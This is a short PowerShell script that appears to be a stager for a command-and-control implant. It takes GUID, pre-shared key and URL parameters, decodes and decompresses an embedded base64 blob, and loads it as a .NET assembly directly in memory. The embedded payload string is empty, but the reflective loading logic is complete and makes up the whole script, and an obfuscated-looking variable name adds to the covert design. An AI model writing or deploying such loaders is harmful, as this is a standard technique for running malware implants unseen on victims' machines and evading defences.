    param (
        [Parameter(Mandatory=$true)][String]$Guid,
        [Parameter(Mandatory=$true)][String]$Psk,
        [Parameter(Mandatory=$true)][String]$Url
    )

    [string[]]$TfCk1c = @($Guid, $Psk, $Url)

$EncodedCompressedFile = @'

'@

$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
$UncompressedFileBytes = New-Object Byte[](105472)
$DeflatedStream.Read($UncompressedFileBytes, 0, 105472) | Out-Null
$asm = [Reflection.Assembly]::Load($UncompressedFileBytes)
